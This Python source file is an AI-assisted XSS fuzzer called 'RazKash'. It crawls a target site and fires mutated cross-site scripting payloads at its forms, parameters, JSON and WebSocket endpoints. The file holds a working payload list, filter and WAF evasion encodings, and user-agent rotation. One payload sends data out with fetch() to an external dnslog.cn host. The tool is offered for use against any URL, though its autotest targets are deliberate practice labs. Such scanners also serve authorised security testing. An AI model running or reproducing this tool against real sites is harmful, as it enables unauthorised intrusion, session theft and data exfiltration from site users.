#!/usr/bin/env python3
# =============================================================================
# RazKash 𝕏SS AI Fuzzer (v8.0-universal, 2025-05-01)
# Author : Haroon Ahmad Awan · CyberZeus (mrharoonawan@gmail.com)
# GPU acceleration, advanced XSS variant coverage, CSP bypass stubs, polyglot,
# OOB/blind, DOM/template injections, CSS/style, protocol handlers, evasion, etc.
# =============================================================================

import os
import re
import ssl
import sys
import json
import time
import random
import string
import argparse
import warnings
import logging
import base64
import threading
import contextlib
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import List, Dict, Any
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor

import urllib.parse
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

import torch
from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log

# Optional Playwright & websocket-client
try:
    from playwright.sync_api import sync_playwright, Request as PWReq, WebSocket as PWWS, Response as PWResp
except ImportError:
    sync_playwright = None
try:
    import websocket
except ImportError:
    websocket = None

# ─── CONFIG ─────────────────────────────────────────────────────────────────
VER                = "8.0-universal"
MODEL              = "microsoft/codebert-base"
DNSLOG_DOMAIN      = "q68w9p.dnslog.cn"
LOGFILE            = Path("razkash_findings.md")
TOP_K              = 7
DEF_THREADS        = 14
MAX_STATIC_PAGES   = 250
DYN_OBS_MS         = 20000
RESCAN_MS          = 600
MAX_DYN_ROUNDS     = 80
HTTP_TIMEOUT       = 12
VERIFY_TIMEOUT     = 9000
HEADLESS_WAIT      = 3500

# ─── ARGS & LOGGING ──────────────────────────────────────────────────────────
ap = argparse.ArgumentParser(description="RazKash XSS AI Fuzzer v8.0-universal")
ap.add_argument("-u","--url", help="Target root URL")
ap.add_argument("--autotest", action="store_true", help="Run built-in playgrounds")
ap.add_argument("--threads", type=int, default=DEF_THREADS)
ap.add_argument("--max-pages", type=int, default=MAX_STATIC_PAGES)
ap.add_argument("--debug", action="store_true")
args = ap.parse_args()
DEBUG = args.debug

logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s" if DEBUG else "%(message)s"
)
warnings.filterwarnings("ignore")
hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"] = "1"
ssl._create_default_https_context = ssl._create_unverified_context

def dbg(msg: str):
    if DEBUG:
        logging.debug(msg)

# ─── UTILITIES ──────────────────────────────────────────────────────────────
randstr = lambda n=12: ''.join(random.choices(string.ascii_letters + string.digits, k=n))
def jitter(a, b): time.sleep(random.uniform(a, b))
def smart_url(b: str) -> str:
    if b.startswith(("http://","https://")):
        return b
    for s in ("https://","http://"):
        try:
            r = requests.head(s+b, timeout=5, allow_redirects=True, verify=False)
            if r.status_code < 500:
                return s+b
        except:
            continue
    return "http://"+b

def random_headers() -> Dict[str,str]:
    ua = UserAgent()
    return {
        "User-Agent": ua.random,
        "Accept":"*/*",
        "Accept-Language":"en-US,en;q=0.9",
        "Accept-Encoding":"gzip, deflate",
        "Connection":"keep-alive",
        "DNT": random.choice(["1","0"])
    }

# ─── AI PAYLOAD MUTATION (GPU ENABLED) ───────────────────────────────────────
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
tok = AutoTokenizer.from_pretrained(MODEL)
mdl = AutoModelForMaskedLM.from_pretrained(MODEL).to(device).eval()
MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id

def ai_mutate(s: str) -> str:
    while "MASK" in s:
        ids = tok(s.replace("MASK", MASK_T, 1), return_tensors="pt").input_ids.to(device)
        with torch.no_grad():
            logits = mdl(input_ids=ids).logits
        pos = (ids == MASK_ID).nonzero(as_tuple=True)[1][0]
        token_id = random.choice(logits[0, pos].topk(TOP_K).indices.tolist())
        w = tok.decode(token_id).strip() or "alert(1)"
        s = s.replace("MASK", w, 1)
    return s

def polymorph(s: str) -> str:
    choice = random.choice(["hex","uni","url","b64","none"])
    if choice == "hex":
        return ''.join(f"\\x{ord(c):02x}" for c in s)
    if choice == "uni":
        return ''.join(f"\\u{ord(c):04x}" for c in s)
    if choice == "url":
        return urllib.parse.quote(s)
    if choice == "b64":
        return base64.b64encode(s.encode()).decode()
    return s

def legit_wrap(s: str) -> str:
    wrappers = [
        "<div hidden>PAYLOAD</div>",
        "<span style=display:none>PAYLOAD</span>",
        "<p data-i=PAYLOAD></p>",
        "<video srcdoc='<script>PAYLOAD</script>'></video>",
        "<template id=tpl>PAYLOAD</template><script>document.body.append(tpl.content)</script>"
    ]
    return random.choice(wrappers).replace("PAYLOAD", s)

def reflected(marker: str, html: str) -> bool:
    low = html.lower()
    return marker.lower() in low or SequenceMatcher(None, marker.lower(), low).quick_ratio() > 0.8

# ─── PAYLOAD & FILTER COLLECTION ─────────────────────────────────────────────
PAY = []
# HTML/script contexts
PAY += [
    "<script>MASK</script>",
    "<body onload=MASK>",
    "<img src=x onerror=\"MASK\">",
    "<svg><script>MASK</script></svg>",
    "<iframe srcdoc=\"<script>MASK</script>\"></iframe>"
]
# Attribute contexts
PAY += [
    '<div title="MASK">x</div>',
    '<span data-info="MASK"></span>'
]
# URL contexts
PAY += [
    "javascript:MASK",
    "data:text/html,<script>MASK</script>",
    "vbscript:MASK"
]
# CSS contexts
PAY += [
    '<div style="background:url(javascript:MASK)"></div>',
    '<style>@import "javascript:MASK";</style>',
    '<div style="width:expression(MASK)"></div>'
]
# SVG/XLink
PAY += ['<svg><image xlink:href="javascript:MASK"></image></svg>']
# Polyglot
PAY += ['/**/<script>MASK</script>/**/']
# Client template (Angular/Vue/React)
PAY += ['{{MASK}}','<div v-html="MASK"></div>','<div dangerouslySetInnerHTML={{__html:MASK}}></div>']
# Mutation Observer
PAY += ['<script>new MutationObserver(_=>MASK).observe(document.body,{childList:true})</script>']
# Prototype pollution example
PAY += ['<script>Object.prototype.alert=function(){MASK}</script>']

# Evasion filters
FILTER = [
    "<sCrIpT>PAYLOAD</sCrIpT>",
    "<!-->PAYLOAD<!-->",
    "<object data=\"javascript:PAYLOAD\"></object>",
    "<meta http-equiv=refresh content=\"0;url=javascript:PAYLOAD\">"
]

if DNSLOG_DOMAIN:
    PAY.append(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa('MASK'))>")

# ─── VERIFYER (DETECTS DOM/INLINE/EVAL...) ───────────────────────────────────
JSFLAG = """
window._xss_triggered=false;
function _f(){window._xss_triggered=true;}
['innerHTML','outerHTML','insertAdjacentHTML','appendChild'].forEach(p=>{
  const d=Object.getOwnPropertyDescriptor(Element.prototype,p)||{};
  if(d.set) Object.defineProperty(Element.prototype,p,{set(v){_f();d.set.call(this,v)},configurable:true});
});
const _e=window.eval;window.eval=function(...a){_f();return _e(...a)};
const _F=Function;window.Function=function(...a){_f();return new _F(...a)};
"""

def verify(url: str, method: str, data: Any, is_json=False) -> bool:
    if not sync_playwright:
        dbg("[verify] skipping—Playwright unavailable")
        return False
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True,
                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
            ctx = browser.new_context(ignore_https_errors=True,
                                      user_agent=UserAgent().random)
            ctx.add_init_script(JSFLAG)
            page = ctx.new_page()
            page.on("dialog", lambda d:(d.dismiss(), page.evaluate("_f()")))
            if method == "GET":
                page.goto(f"{url}?{urllib.parse.urlencode(data)}",
                          timeout=VERIFY_TIMEOUT, wait_until="domcontentloaded")
            else:
                hdr = {"Content-Type":"application/json"} if is_json else {"Content-Type":"application/x-www-form-urlencoded"}
                body = json.dumps(data) if is_json else urllib.parse.urlencode(data)
                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="domcontentloaded")
                page.evaluate("(u,h,b)=>fetch(u,{method:'POST',headers:h,body:b})", url, hdr, body)
            page.wait_for_timeout(HEADLESS_WAIT)
            triggered = page.evaluate("window._xss_triggered")
            ctx.close(); browser.close()
            return bool(triggered)
    except Exception as e:
        dbg(f"[verify] {e}")
        return False

# ─── LOGGING ────────────────────────────────────────────────────────────────
if not LOGFILE.exists():
    LOGFILE.write_text(f"# RazKash Findings v{VER}\n\n","utf-8")
_hits = set()
log_lock = threading.Lock()

def log_hit(url: str, method: str, payload: str):
    entry = f"- **XSS** {method} `{url}` payload=`{payload[:90]}`\n"
    with log_lock:
        if entry in _hits:
            return
        _hits.add(entry)
        LOGFILE.write_text(LOGFILE.read_text("utf-8") + entry, "utf-8")
    logging.info(entry.strip())

# ─── JS DISCOVERY HELPERS ──────────────────────────────────────────────────
JS_CALL_RE = re.compile(r"""(?:fetch\(|axios\.\w+\(|XHR\.open)\([^'"]*['"](/[^'"]+)['"]""")
JS_URL_RE  = re.compile(r"""['"](/[^'"]+\.(?:js|php|asp|jsp|json|api|graphql|cgi))['"]""", re.I)

def mine_js(url: str, host: str) -> List[str]:
    found = []
    try:
        resp = requests.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        text = resp.text
        for m in JS_URL_RE.findall(text):
            found.append(m)
        found += JS_CALL_RE.findall(text)
        if url.endswith(".js") and "sourceMappingURL" in text:
            sm = url.rsplit("/",1)[0] + "/" + text.split("sourceMappingURL=")[-1].split("\n")[0].strip()
            found += mine_js(sm, host)
    except Exception as e:
        dbg(f"[mine_js] {e}")
    return [urllib.parse.urljoin(url, u) for u in set(found)
            if urllib.parse.urlparse(urllib.parse.urljoin(url, u)).netloc.lower() == host]

def misc_assets(root: str) -> List[str]:
    base = urllib.parse.urlparse(root)._replace(path="", query="", fragment="").geturl()
    assets = []
    try:
        rt = requests.get(base + "/robots.txt", headers=random_headers(),
                          timeout=HTTP_TIMEOUT, verify=False).text
        for line in rt.splitlines():
            if line.lower().startswith("sitemap:"):
                assets.append(line.split(":",1)[1].strip())
        for sm in assets.copy():
            xml = requests.get(sm, headers=random_headers(),
                               timeout=HTTP_TIMEOUT, verify=False).text
            tree = ET.fromstring(xml)
            for loc in tree.iter("{*}loc"):
                assets.append(loc.text.strip())
        for p in ("/manifest.json","/ngsw.json"):
            data = requests.get(base+p, headers=random_headers(),
                                timeout=HTTP_TIMEOUT, verify=False).text
            j = json.loads(data) if data else {}
            for arr in ("assets","files"):
                for v in j.get(arr, []):
                    assets.append(base + v if v.startswith("/") else v)
    except Exception as e:
        dbg(f"[misc_assets] {e}")
    return list(set(assets))

# ─── STATIC CRAWLER ─────────────────────────────────────────────────────────
def crawl_static(root: str, cap: int) -> List[Dict[str,Any]]:
    visited = set()
    queue = [root] + misc_assets(root)
    targets = []
    host = urllib.parse.urlparse(root).netloc.lower()
    logging.info(f"[static] crawling {root} (up to {cap} pages)")
    while queue and len(visited) < cap:
        u = queue.pop(0)
        if u in visited: continue
        visited.add(u)
        try:
            r = requests.get(u, headers=random_headers(),
                             timeout=HTTP_TIMEOUT, verify=False)
        except Exception as e:
            dbg(f"[static] {e}"); continue
        ctype = r.headers.get("Content-Type","")
        if "javascript" in ctype:
            for js in mine_js(u, host):
                if js not in visited:
                    queue.append(js)
            continue
        if "html" not in ctype:
            continue
        soup = BeautifulSoup(r.text, "html.parser")
        # <script src="?">
        for tag in soup.find_all("script", src=True):
            src = urllib.parse.urljoin(u, tag["src"])
            if urllib.parse.urlparse(src).netloc.lower()==host and src not in visited:
                queue.append(src)
        # <a href="?">
        for a in soup.find_all("a", href=True):
            nxt = urllib.parse.urljoin(u, a["href"])
            p = urllib.parse.urlparse(nxt)
            if p.netloc.lower()!=host: continue
            if nxt not in visited:
                queue.append(nxt)
            if p.query:
                params = list(urllib.parse.parse_qs(p.query).keys())
                targets.append({"url":p._replace(query="").geturl(),
                                "method":"GET","params":params})
        # <form>
        for fm in soup.find_all("form"):
            act = urllib.parse.urljoin(u, fm.get("action") or u)
            if urllib.parse.urlparse(act).netloc.lower()!=host: continue
            m = fm.get("method","get").upper()
            inp = [i.get("name") for i in fm.find_all(["input","textarea","select"])
                   if i.get("name")]
            if inp:
                targets.append({"url":act,"method":m,"params":inp})
        # JS in-page calls
        for m in JS_CALL_RE.findall(r.text):
            uc = urllib.parse.urljoin(u, m)
            if urllib.parse.urlparse(uc).netloc.lower()==host and uc not in visited:
                queue.append(uc)
        # direct JS URLs
        for mm in JS_URL_RE.findall(r.text):
            uc = urllib.parse.urljoin(u, mm)
            if urllib.parse.urlparse(uc).netloc.lower()==host and uc not in visited:
                queue.append(uc)
        jitter(0.3,1.0)
    logging.info(f"[static] discovered {len(targets)} endpoints")
    return targets

# ─── DYNAMIC CRAWLER ────────────────────────────────────────────────────────
def crawl_dynamic(root: str) -> List[Dict[str,Any]]:
    if not sync_playwright:
        logging.info("[dynamic] skipping dynamic crawl (Playwright missing)")
        return []
    host = urllib.parse.urlparse(root).netloc.lower()
    seen = set()
    found = []
    logging.info(f"[dynamic] launching Playwright for {root}")
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
            )
            ctx = browser.new_context(
                ignore_https_errors=True,
                user_agent=UserAgent().random,
                service_workers="allow"
            )
            page = ctx.new_page()
            def on_req(req: PWReq):
                url = req.url
                if urllib.parse.urlparse(url).netloc.lower()!=host or url in seen:
                    return
                seen.add(url)
                m = req.method.upper()
                hdr = req.headers.get("content-type","")
                is_json = "json" in hdr or "graphql" in hdr
                tpl = None
                keys = []
                if is_json and req.post_data:
                    with contextlib.suppress(Exception):
                        j = json.loads(req.post_data)
                        tpl = j.get("variables", j) if isinstance(j, dict) else {}
                        keys = deep_keys(tpl)
                qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())
                params = keys or qs or ["data"]
                found.append({
                    "url": url.split("?",1)[0],
                    "method": m if m in {"POST","PUT"} else "GET",
                    "params": params,
                    "json": bool(keys),
                    "template": tpl
                })
            page.on("request", on_req)
            def dom_scrape():
                forms = page.evaluate("""() => Array.from(document.forms).map(f=>({
                    action: f.action||location.href,
                    method: (f.method||'get').toUpperCase(),
                    params: Array.from(f.querySelectorAll('input[name],textarea[name],select[name]')).map(i=>i.name)
                }))""")
                for f in forms:
                    a = f["action"]
                    if (urllib.parse.urlparse(a).netloc.lower()!=host
                        or not f["params"]):
                        continue
                    found.append({"url":a,"method":f["method"],"params":f["params"]})
            page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
            dom_scrape()
            start=time.time()*1000; rounds=0
            while (time.time()*1000 - start) < DYN_OBS_MS and rounds < MAX_DYN_ROUNDS:
                with contextlib.suppress(Exception):
                    page.wait_for_timeout(RESCAN_MS)
                dom_scrape(); rounds+=1
            ctx.close(); browser.close()
    except Exception as e:
        dbg(f"[dynamic] {e}")
    logging.info(f"[dynamic] discovered {len(found)} endpoints")
    return found

# ─── JSON KEY HELPERS ────────────────────────────────────────────────────────
def deep_keys(o: Any, prefix: str="") -> List[str]:
    keys=[]
    if isinstance(o, dict):
        for k,v in o.items():
            p=f"{prefix}.{k}" if prefix else k
            if isinstance(v, (dict,list)):
                keys+=deep_keys(v,p)
            else:
                keys.append(p)
    elif isinstance(o, list):
        for i,v in enumerate(o):
            p=f"{prefix}[{i}]"
            if isinstance(v,(dict,list)): keys+=deep_keys(v,p)
            else: keys.append(p)
    return keys

def set_deep(o: Any, path: str, val: Any):
    parts = [seg for seg in re.split(r'\.|\[|\]', path) if seg]
    cur = o
    for seg in parts[:-1]:
        if seg.isdigit(): continue
        cur = cur.setdefault(seg, {})
    leaf = parts[-1]
    if not leaf.isdigit():
        cur[leaf] = val

# ─── FUZZERS ────────────────────────────────────────────────────────────────
def fuzz_http(t: Dict[str,Any]):
    url, meth = t["url"], t["method"]
    is_json, tpl = t.get("json", False), t.get("template")
    mk = randstr()

    # initial probe
    try:
        if is_json and tpl:
            body=json.loads(json.dumps(tpl)); set_deep(body, random.choice(t["params"]), mk)
            resp=requests.post(url, headers={"Content-Type":"application/json"},
                               data=json.dumps(body), timeout=HTTP_TIMEOUT, verify=False)
        else:
            data={p:mk for p in t["params"]}
            resp=(requests.get if meth=="GET" else requests.post)(
                url, params=data if meth=="GET" else None,
                data=data if meth=="POST" else None,
                headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False
            )
        if resp.status_code!=200 or not reflected(mk, resp.text):
            return
    except Exception as e:
        dbg(f"[probe] {e}"); return

    # generate variants
    for sk in random.sample(PAY, k=min(len(PAY), 24)):
        base = ai_mutate(sk)
        variants = {base, polymorph(base), legit_wrap(base)}
        for fw in FILTER:
            variants.add(fw.replace("PAYLOAD", base))
        if DNSLOG_DOMAIN:
            variants.add(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa('{urllib.parse.quote(base)}'))>")

        for pay in variants:
            try:
                if is_json and tpl:
                    body=json.loads(json.dumps(tpl))
                    for pnm in t["params"]:
                        set_deep(body, pnm, pay)
                    r2 = requests.post(url, headers={"Content-Type":"application/json"},
                                       data=json.dumps(body), timeout=HTTP_TIMEOUT, verify=False)
                else:
                    dat={p: pay for p in t["params"]}
                    r2=(requests.get if meth=="GET" else requests.post)(
                        url, params=dat if meth=="GET" else None,
                        data=dat if meth=="POST" else None,
                        headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False
                    )

                txt = r2.text.lower()
                if (r2.status_code in {403,429,503}
                    or any(w in txt for w in ("captcha","access denied","blocked"))):
                    dbg(f"[waf] {url}"); jitter(25,55); return

                if reflected(pay, r2.text) or verify(url, meth, dat if not is_json else body, is_json):
                    log_hit(url, meth, pay)
                    return
            except Exception as e:
                dbg(f"[err] {e}")
            jitter(1.0,2.4)

def fuzz_ws(t: Dict[str,Any]):
    if not websocket: return
    url, params = t["url"], t.get("params", [])
    tpl = t.get("template") or {}
    mk = randstr()
    body = json.loads(json.dumps(tpl)) if tpl else {}
    if body:
        set_deep(body, random.choice(params), f"<img src onerror=alert('{mk}')>")
    else:
        body[random.choice(params)] = f"<svg/onload=alert('{mk}')>"
    payload = json.dumps(body)
    hit=False

    def on_msg(ws, msg):
        nonlocal hit
        if mk in msg: hit=True

    try:
        wsapp = websocket.WebSocketApp(url, on_message=on_msg)
        thr = threading.Thread(target=wsapp.run_forever,
                               kwargs={"sslopt":{"cert_reqs":ssl.CERT_NONE}})
        thr.daemon=True; thr.start()
        time.sleep(1); wsapp.send(payload); time.sleep(3); wsapp.close()
        if hit:
            log_hit(url, "WS", payload)
    except Exception as e:
        dbg(f"[ws] {e}")

# ─── MAIN ──────────────────────────────────────────────────────────────────
AUTOTEST = [
    "xss-game.appspot.com",
    "testphp.vulnweb.com",
    "portswigger.net/web-security/xss"
]

def main():
    roots=[]
    if args.autotest:
        roots=[smart_url(h) for h in AUTOTEST]
    elif args.url:
        roots=[smart_url(args.url.rstrip("/"))]
    else:
        ap.print_help(); sys.exit(1)

    logging.info(f"\n┌─ RazKash AI XSS v{VER}")
    for root in roots:
        logging.info(f"├─▶ {root}")
        static_targets = crawl_static(root, args.max_pages)
        dynamic_targets = crawl_dynamic(root)
        if not dynamic_targets and not sync_playwright:
            logging.info("[main] dynamic crawl skipped, using static only")
        targets = static_targets + dynamic_targets
        http_t = [t for t in targets if t["method"]!="WS"]
        ws_t   = [t for t in targets if t["method"]=="WS"]
        logging.info(f"│   Endpoints: {len(targets)} (HTTP:{len(http_t)}, WS:{len(ws_t)})")
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            pool.map(fuzz_http, http_t)
            pool.map(fuzz_ws, ws_t)
        logging.info("│   ✓ done fuzzing\n")
    logging.info(f"└─ Results in {LOGFILE.resolve()}\n")

if __name__ == "__main__":
    main()
